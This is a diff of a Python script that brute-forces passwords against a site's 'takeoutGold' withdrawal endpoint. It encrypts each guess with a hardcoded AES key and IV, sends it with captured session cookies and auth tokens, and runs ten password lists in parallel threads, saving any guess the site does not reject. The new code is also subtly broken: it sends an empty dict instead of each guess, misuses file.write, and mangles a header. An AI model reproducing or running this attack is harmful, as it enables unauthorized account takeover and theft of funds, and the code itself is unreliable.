@@ -1,9 +1,10 @@
 import base64
-import hashlib
 import time
+import requests
 
-from Crypto.Cipher import AES, DES
-import httpx
+from Crypto.Cipher import AES
+from concurrent.futures import ThreadPoolExecutor
+
 
 class DeAesCrypt:
     """
@@ -14,15 +15,10 @@ class DeAesCrypt:
         """
         :param data: 加密后的字符串
         :param key: 随机的16位字符
-        :param pad: 填充方式
+        :param pad:  填充方式
         """
         self.key = key.encode("utf-8")
-        # self.data = data
         self.pad = pad.lower()
-
-        hash_obj = hashlib.md5()  # 构造md5对象
-        hash_obj.update(key.encode())  # 进行md5加密,md5只能对byte类型进行加密
-        res_md5 = hash_obj.hexdigest()  # 获取加密后的字符串数据
         self.iv = iv.encode("utf-8")
 
     def zeropadding(self, text):
@@ -31,12 +27,9 @@ class DeAesCrypt:
         return str.encode(text)
 
     def decrypt_aes(self, data):
-        """AES-128-CBC解密"""
-        # real_data = base64.b64decode(self.data)
         real_data = base64.b64decode(data)
         my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
         decrypt_data = my_aes.decrypt(real_data)
-        print(decrypt_data)
         return self.get_str(decrypt_data)
 
     def encyrpt_aes(self, data):
@@ -59,7 +52,6 @@ class DeAesCrypt:
         else:
             return "不存在此种数据填充方式"
 
-import requests
 
 cookies = {
     'session_sslproxy_server': 'c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc',
@@ -69,7 +61,7 @@ cookies = {
 
 headers = {
     'authority': 'www.4424477.com',
-    'accept': 'application/json, text/plain, */*',
+    'accept': 'application/json, text/plain, *6/*',
     'accept-language': 'zh',
     'auth': 'PDVeHfDXg2h2l1OrxN5fPYDUgW0qkH-wRME39zboQgTIaW-xDq_aXC_fxeKd13_uUJo6mJAvrAuW1U3oeOTZvd197qJfRCcRDUvSP_EtuIPLZ3Gv-riYlxf20NWU4fEcNt7O56YMS_m2blJ808pUWqVGj83_FHuQDC4esfXdld8tOB8mzSEhbym4uI4v_dGK-QTvdF-j4lWF27Awcud2CneVJVAITNPV8myns5h6Tbb_GZnyIDWnS6zQhRfgaP2TiKTAkOUazEb5nd_rd7UQGHo_c9s9h5EDNSDajNNkTtwpS-ss1sufNozYPVNh8nJo3fNKrl4T-tUVMK8Lk50-wQ',
     'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
@@ -100,45 +92,36 @@ headers = {
     'x-request-id': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
 }
 
-# data = 'MeDIyM0Pu+ctTjecfhlFuSv0cUGQ7YkW8L2NC2loE68tCUKPNfAaI0tSEWU7ZgVzw3QIqD55FcMxis7fRbROGA=='
 
-# response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies, headers=headers, data=data)
+def bao_po(aes_obj=None, file_name=None, wirte_file=None):
+    with open(file_name, "r") as f:
+        for line in f.readlines():
+            try:
+                content = {}
+                payload = aes_obj.encyrpt_aes(content)
+                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,
+                                         headers=headers, data=payload)
+                res = response.json()
+                if "密码不正确" == res.get("msg"):
+                    # print(content, res)
+                    pass
+                else:
+                    with open(wirte_file, "a") as file:
+                        file.write(content, res, "\r")
+                    print("other:", content, res, payload)
+            except Exception as e:
+                # print(e.__traceback__.tb_frame.f_globals["__file__"], e.__traceback__.tb_frame.f_lineno)
+                with open(wirte_file, "a") as file:
+                    file.write(content, res, "\r")
+                print(str(e), "位置:", content, payload)
+                time.sleep(5)
+                continue
+
 
 if __name__ == '__main__':
-    # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
-    # key = "8325b1d23ff2eeb4"
-    # iv = "5421698523412578"
-    # csss = DeAesCrypt(key, iv)
-    # print(data)
-    # jiemi = csss.decrypt_aes(data)
-    # print(jiemi)
-    # jiami = csss.encyrpt_aes(jiemi)
-    # print(jiami)
-    # aes_obj = DeAesCrypt(key, iv)
-    # content = ""
-    # data = aes_obj.encyrpt_aes(content)
-    # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
-    # response = requests.post('https://web.1543434.com/hall/yuebao/takeoutGold', headers=headers, data=data)
-    # print(response.json())
     key = "8325b1d23ff2eeb4"
     iv = "5421698523412578"
     aes_obj = DeAesCrypt(key, iv)
-    with open("pass.txt", "r") as f:
-        for content in f.readlines():
-            try:
-                data = aes_obj.encyrpt_aes(content)
-                # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
-                # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
-                response = httpx.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
-
-                res = response.json()
-                if "密码不正确" == res.get("msg") or res.get("errorCode")==41080:
-                    print(content, res)
-                    pass
-                else:
-                    print(content, res,data)
-            except Exception as e:
-                print(e.__traceback__.tb_frame.f_globals["__file__"],e.__traceback__.tb_frame.f_lineno)
-                print(str(e),"到那了:",content,data)
-                time.sleep(5)
-                continue
+    pool = ThreadPoolExecutor(10)
+    for i in range(0, 10):
+        pool.submit(bao_po, aes_obj, "pass" + f"{i}.txt", "corr_pass" + f"{i}.txt")
